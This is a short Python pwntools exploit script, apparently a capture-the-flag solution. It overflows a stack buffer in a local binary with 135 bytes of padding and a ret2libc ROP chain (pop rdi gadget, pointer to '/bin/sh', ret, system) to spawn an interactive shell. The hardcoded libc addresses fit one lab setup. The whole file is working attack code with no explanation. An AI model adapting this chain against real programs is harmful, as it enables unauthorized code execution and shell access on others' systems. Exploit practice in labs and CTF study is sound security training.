from pwn import *
context.binary = binary = ELF("./AAAAAAAA",checksec=False)
context.log_level = "debug"

p = process()
p.recvuntil("bin/sh")

libc_base = 0x7ffff7dcc000
system = libc_base + 0x4c330
binsh = libc_base + 0x196031
POP_RDI = 0x401203          # pop rdi; ret
RET = 0x40101a              # ret

payload = b'B' * 135        # offset
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(RET)         # gadget ret
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

print(payload)

p.clean()
p.sendline(payload)
p.interactive()
p.recvall()

